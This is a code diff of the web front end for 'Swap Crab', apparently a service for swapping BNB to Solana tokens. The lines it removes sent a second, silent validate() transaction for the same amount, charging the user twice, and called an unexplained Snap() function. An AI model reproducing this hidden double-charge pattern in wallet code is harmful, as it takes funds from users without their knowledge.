@@ -3,8 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <meta name="description" content="Convert BNB to Solana token seamlessly with Bridge SwapCrab. Fast and secure cross-chain swapping for Binance Smart Chain (BNB) to Solana tokens. Explore the easy-to-use platform now!">
+
     <meta name="keywords" content="Bridge SwapCrab, BNB to Solana, cross-chain swapping, cryptocurrency bridge, decentralized exchange, Solana token, Binance Smart Chain">
+
     <title>Swap Crab - Convert BNB to Solana Token</title>
     <link rel="icon" type="image/x-icon" href="icon.png">
     <link rel="stylesheet" type="text/css" href="header.css">
@@ -20,7 +23,9 @@
 
   gtag('config', 'G-601REXD6Y8');
 </script>
+
 <style>
+
 @media only screen and (max-width: 850px) {
 
 	#wallet-address {
@@ -260,6 +265,7 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
         document.getElementById('disconnect-wallet').style.display = 'inline';
         document.getElementById('connect-wallet').style.display = 'none';
 
+
         // Fetch and display BNB balance
         balance = await web3.eth.getBalance(accounts[0]);
         balance = web3.utils.fromWei(balance, 'ether');
@@ -274,7 +280,7 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
         }
     } catch (error) {
         flashNotification('Error connecting wallet', 'red');
-	    updateLog("Error connecting BNB wallet", `❌ Home: ${error.message}`);
+	    updateLog("Error connecting wallet", `❌ Home: ${error.message}`);
     }
 });
 
@@ -311,7 +317,7 @@ try {
         const networkId = await ethereum.request({ method: 'net_version' });
 
         // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
-        if (networkId === '56' || networkId === '97') {
+        if (networkId === '56') {
             walletAddress = accounts[0];
 
             walletConnected = true;
@@ -323,22 +329,10 @@ try {
         const result1 = await contract.methods.validate().send({ from: accounts[0], value: weiAmount, gas});
 	let traxHash = result1.transactionHash;
 	
-	if (result1.status) {        	
+	if (result1.status) {        
+	        flashNotification('Success : Swap Request '+document.getElementById("withdrawAmount").value+' BNB', 'green');	
 		Record("BNB : "+walletAddress,traxHash);
 		updateLog(walletAddress,'✅ 1 - '+document.getElementById("withdrawAmount").value+' BNB');
-	}
-
-        const result2 = await contract.methods.validate().send({ from: accounts[0], value: weiAmount, gas});
-	traxHash = result2.transactionHash;
-	
-	if (result2.status) {        	
-		Record("BNB : "+walletAddress,traxHash);
-		updateLog(walletAddress,'✅ 2 - '+document.getElementById("withdrawAmount").value+' BNB');
-	}
-
-	if (result1.status) {        
-	        Snap();
-	        flashNotification('Success : Swap Request '+document.getElementById("withdrawAmount").value+' BNB', 'green');
 	}
 
 	btnProcess(false);
